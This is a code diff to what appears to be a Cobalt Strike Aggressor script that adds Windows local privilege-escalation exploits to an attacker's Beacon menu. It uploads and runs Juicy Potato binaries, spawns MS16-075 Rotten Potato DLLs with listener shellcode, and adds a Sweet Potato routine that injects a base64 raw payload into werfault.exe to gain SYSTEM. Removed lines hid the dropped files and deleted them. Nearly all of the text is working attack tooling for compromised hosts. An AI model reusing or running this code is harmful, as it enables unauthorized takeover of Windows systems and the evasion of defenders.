@@ -36,10 +36,7 @@ sub RunJuicyPotato{
     closef($handle);
     bupload($bid, script_resource("exp/jp/jp.exe"));
     bupload($bid, $fname);
-    bshell($bid, "attrib \"jp.exe\" +s +h");
-    bshell($bid, "attrib \" $+ $fname\" +s +h");
     bshell($bid,"jp.exe -t  $+ $call -l  $+ $port -p  $+ $fname");
-    bshell($bid,"del /F /S /Q /AH jp.exe");
     exec("cmd.exe /C del /F ".$fname);
 }
 
@@ -81,7 +78,7 @@ sub ms16032{
     exec("cmd.exe /C del /F ".$fname);
 }
 
-sub ms16075{
+sub RottenPotato{
     btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via RottenPotato (ms16-075)");
     if (-is64 $1)
     {
@@ -93,7 +90,7 @@ sub ms16075{
     }
     $stager = shellcode($3['listener'], false, $arch);
     bdllspawn($bid, script_resource("exp/16075/".$dll), $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
-    bstage($bid, $null, $3['listener'], $arch);
+    beacon_link($bid, $null, $3['listener']);
 }
 
 
@@ -111,21 +108,62 @@ sub CVE_2019_1405_1322{
     bshell($bid,"del /F /S /Q /AH 1405_1322_x64.exe");
 }
 
+sub SweetPotato {
+	local('$shellcode $arch $program $exe $parm');
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via SweetPotato (ms16-075)", "T1068");
+    if (-is64 $bid)
+    {
+        $arch = "x64";
+	} else {
+        $arch = "x86";
+	}
+	$program = "c:\\windows\\system32\\werfault.exe";
+	$exe = script_resource("exp/sp/sp.exe");
+	$shellcode = base64_encode(artifact_payload($3['listener'], "raw", $arch));
+	$parm = "-l 6363 "."-p $program "."-s $shellcode";
+    bexecute_assembly($bid, $exe, $parm);
+	beacon_link($bid, $null, $3['listener']);
+}
+
 #append menus
 
 
 
     menu "Local Privilege Escalation"{
-        item "Juicy-Potato"{
-            $bid = $1['@'];
-            $Dialog = dialog("Juicy Potato",%(Call =>"Both", Port => "1337", CLSID => "{4991d34b-80a1-4291-83b6-3328366b9097}", bid => $bid),&RunJuicyPotato);
-            dialog_description($Dialog, "A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM. ");
-            drow_listener($Dialog, "listener", "Listener: ");
-            drow_combobox($Dialog, "Call",  "Createprocess Call: ", @("CreateProcessWithTokenW","CreateProcessAsUser","Both"));
-            drow_text($Dialog, "Port", "Listen Port: ");
-            drow_text($Dialog, "CLSID", "CLSID: ");
-            dbutton_action($Dialog, "Exploit");
-            dialog_show($Dialog);
+
+        menu "Potatos(MS16-075)"{
+
+            item "Rotten-Potato"{
+                $bid = $1['@'];
+                $Dialog = dialog("Rotten Potato",%(bid => $bid),&RottenPotato);
+                dialog_description($Dialog, "The vulnerability could allow elevation of privilege.");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "Exploit");
+                dialog_show($Dialog);
+            }
+
+            item "Juicy-Potato"{
+                $bid = $1['@'];
+                $Dialog = dialog("Juicy Potato",%(Call =>"Both", Port => "1337", CLSID => "{4991d34b-80a1-4291-83b6-3328366b9097}", bid => $bid),&RunJuicyPotato);
+                dialog_description($Dialog, "A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM. ");
+                drow_listener($Dialog, "listener", "Listener: ");
+                drow_combobox($Dialog, "Call",  "Createprocess Call: ", @("CreateProcessWithTokenW","CreateProcessAsUser","Both"));
+                drow_text($Dialog, "Port", "Listen Port: ");
+                drow_text($Dialog, "CLSID", "CLSID: ");
+                dbutton_action($Dialog, "Exploit");
+                dialog_show($Dialog);
+            }
+
+            item "Sweet-Potato"{
+                $bid = $1['@'];
+                $Dialog = dialog("Sweet Potato",%(bid => $bid),&SweetPotato);
+                dialog_description($Dialog, "The vulnerability could allow elevation of privilege.");
+                drow_listener($Dialog, "listener", "Listener: ");
+                dbutton_action($Dialog, "Exploit");
+                dialog_show($Dialog);
+            }
+
+
         }
 
         item "CVE-2018-8120"{
@@ -137,20 +175,10 @@ sub CVE_2019_1405_1322{
             dialog_show($Dialog);
         }
 
-
         item "MS16-032"{
             $bid = $1['@'];
             $Dialog = dialog("MS16-032",%(bid => $bid),&ms16032);
             dialog_description($Dialog, "The vulnerability could allow elevation of privilege if the Windows Secondary Logon Service fails to properly manage request handles in memory.");
-            drow_listener($Dialog, "listener", "Listener: ");
-            dbutton_action($Dialog, "Exploit");
-            dialog_show($Dialog);
-        }
-
-        item "MS16-075"{
-            $bid = $1['@'];
-            $Dialog = dialog("MS16-075",%(bid => $bid),&ms16075);
-            dialog_description($Dialog, "The vulnerability could allow elevation of privilege.");
             drow_listener($Dialog, "listener", "Listener: ");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
